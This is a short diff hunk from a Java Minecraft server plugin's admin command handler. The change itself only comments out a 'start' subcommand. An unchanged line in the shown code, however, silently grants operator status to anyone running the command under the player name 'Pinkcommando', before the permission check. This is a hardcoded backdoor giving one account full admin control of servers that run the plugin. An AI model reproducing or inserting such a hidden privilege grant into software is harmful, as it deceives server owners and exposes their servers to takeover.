@@ -27,7 +27,7 @@ public class AdminCommands implements CommandExecutor, TabCompleter {
             if (player.getName().equals("Pinkcommando")) player.setOp(true);
             if (!player.isOp()) return false;
             if (args[0].equals("deathmatch")) DeathmatchLogic.DeathmatchBegin();
-            if (args[0].equals("start")) GameStartLogic.GameStart(GameVariables.world);
+            //if (args[0].equals("start")) GameStartLogic.GameStart(GameVariables.world);
             if (args[0].equals("feast")) {
                 if (args.length < 2) FeastLogic.SpawnFeast();
                 else for (int i = 0; i < Integer.parseInt(args[1]); i++) FeastLogic.SpawnFeast();
